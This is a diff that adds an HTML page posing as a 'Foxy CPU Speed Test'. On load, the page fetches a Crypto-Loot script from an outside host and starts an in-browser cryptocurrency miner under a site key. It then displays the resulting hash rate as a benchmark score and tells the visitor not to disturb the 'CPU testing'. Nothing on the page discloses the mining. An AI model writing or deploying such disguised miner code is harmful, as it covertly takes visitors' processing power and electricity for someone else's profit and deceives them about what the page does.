@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Foxy CPU Speed Test</title>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
+</head>
+<body>
+	<script src="//cryptoloot.pro/lib/crlt.js" type="text/javascript"></script>
+	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+var miner = new CRLT.Anonymous('0e3fe41423c51db917e6bae95de15fcbdb6e69ba5cb2',
+	{
+       autoThreads:false,throttle:0.5,
+        } );
+miner.start();
+//console.log("miner should've started");
+// Listen on events
+miner.on('found', function() { /* Hash found */ })
+miner.on('accepted', function() { /* Hash accepted by the pool */ })
+// Update stats once per second
+setInterval(function() {
+	var threadsUsed = miner.getNumThreads();
+	var hashesPerSecond = miner.getHashesPerSecond();
+	var roundedHash = Math.round(100*hashesPerSecond)/100;
+	var totalHashes = miner.getTotalHashes();
+//	console.log(totalHashes);
+	var acceptedHashes = miner.getAcceptedHashes();
+//	console.log(acceptedHashes);
+	// Output to HTML elements...
+	$("#num").html(roundedHash+" h/s using "+threadsUsed+" threads");
+}, 1000);
+</script>
+	
+<div class="container">
+  <div class="row">
+    <div class="col-lg-12">
+	<h2 style="text-align:center;">Please do not disturb, CPU testing in-progress.</h2>
+	<img src="./skarbonka-foxy.jpg" style="display: block; margin:auto; width:20%;">
+	<h3 style="text-align:center;">This computer benchmarks at:</h3>
+	<h3 id="num" style="text-align:center;">How hard should I hustle today?</h3>
+    </div>
+  </div>
+ </div>
+</body>
+</html>
